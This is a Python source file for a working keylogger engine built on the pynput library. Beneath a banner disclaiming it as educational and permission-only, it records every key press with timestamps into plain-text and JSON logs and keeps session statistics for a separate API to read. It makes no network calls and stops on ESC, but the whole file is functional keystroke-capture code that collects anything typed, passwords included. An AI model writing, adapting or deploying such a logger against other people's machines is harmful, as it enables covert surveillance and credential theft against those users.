"""
╔══════════════════════════════════════════════════════════════════╗
║         KEYLOGGER ENGINE — Educational / Research Use Only       ║
║  ⚠️  Use only on systems you own or have explicit permission to  ║
║     monitor. Unauthorized use is illegal and unethical.          ║
╚══════════════════════════════════════════════════════════════════╝
"""
import os
import json
import time
import threading
from datetime import datetime
from pynput import keyboard
# ─── Configuration ───────────────────────────────────────────────
LOG_DIR = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "logs")
LOG_FILE = os.path.join(LOG_DIR, "keystrokes.log")
JSON_FILE = os.path.join(LOG_DIR, "keystrokes.json")
STATE_FILE = os.path.join(LOG_DIR, "state.json")
os.makedirs(LOG_DIR, exist_ok=True)
# ─── Shared State ────────────────────────────────────────────────
session_data = {
    "session_id": datetime.now().strftime("%Y%m%d_%H%M%S"),
    "start_time": datetime.now().isoformat(),
    "total_keystrokes": 0,
    "special_keys": 0,
    "regular_keys": 0,
    "backspaces": 0,
    "is_running": False,
    "keystrokes": []
}
lock = threading.Lock()
def save_state():
    """Persist session state to disk for the API to read."""
    with lock:
        state_copy = {k: v for k, v in session_data.items() if k != "keystrokes"}
        with open(STATE_FILE, "w") as f:
            json.dump(state_copy, f, indent=2)
def log_to_file(entry: str):
    """Append a human-readable entry to the plain text log."""
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(entry + "\n")
def log_to_json(record: dict):
    """Append a structured keystroke record to the JSON log."""
    records = []
    if os.path.exists(JSON_FILE):
        try:
            with open(JSON_FILE, "r", encoding="utf-8") as f:
                records = json.load(f)
        except (json.JSONDecodeError, ValueError):
            records = []
    records.append(record)
    with open(JSON_FILE, "w", encoding="utf-8") as f:
        json.dump(records, f, indent=2, ensure_ascii=False)
def on_press(key):
    """Callback fired on every key press."""
    timestamp = datetime.now()
    ts_str = timestamp.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
    try:
        key_char = key.char if key.char is not None else "?"
        key_type = "regular"
        display = key_char
    except AttributeError:
        key_char = str(key).replace("Key.", "").upper()
        key_type = "special"
        display = f"[{key_char}]"
    is_backspace = (key_type == "special" and "BACKSPACE" in key_char.upper())
    record = {
        "timestamp": ts_str,
        "key": key_char,
        "display": display,
        "type": key_type,
        "is_backspace": is_backspace,
        "session_id": session_data["session_id"]
    }
    with lock:
        session_data["total_keystrokes"] += 1
        if key_type == "regular":
            session_data["regular_keys"] += 1
        else:
            session_data["special_keys"] += 1
        if is_backspace:
            session_data["backspaces"] += 1
        # Keep last 500 in memory
        session_data["keystrokes"].append(record)
        if len(session_data["keystrokes"]) > 500:
            session_data["keystrokes"].pop(0)
    # Write to files
    log_to_file(f"[{ts_str}] {display}")
    log_to_json(record)
    save_state()
    # Stop if ESC is pressed (for testing convenience)
    if key == keyboard.Key.esc:
        print("\n[*] ESC detected — stopping keylogger.")
        return False
def on_release(key):
    """Optional: track key release (not logged to file by default)."""
    pass
def start_keylogger():
    """Start the keyboard listener in blocking mode."""
    global session_data
    session_data["is_running"] = True
    save_state()
    banner = (
        f"\n{'='*60}\n"
        f"  🔐 KeyLogger Started — Session: {session_data['session_id']}\n"
        f"  📅 Time: {session_data['start_time']}\n"
        f"  📁 Log: {LOG_FILE}\n"
        f"  ⚠️  Press ESC to stop\n"
        f"{'='*60}\n"
    )
    print(banner)
    log_to_file(banner)
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
    session_data["is_running"] = False
    session_data["end_time"] = datetime.now().isoformat()
    save_state()
    print(f"\n[✓] Session ended. Total keystrokes: {session_data['total_keystrokes']}")
    print(f"[✓] Log saved to: {LOG_FILE}")
def get_session_data():
    """Return a thread-safe copy of current session data."""
    with lock:
        return dict(session_data)
if __name__ == "__main__":
    start_keylogger()
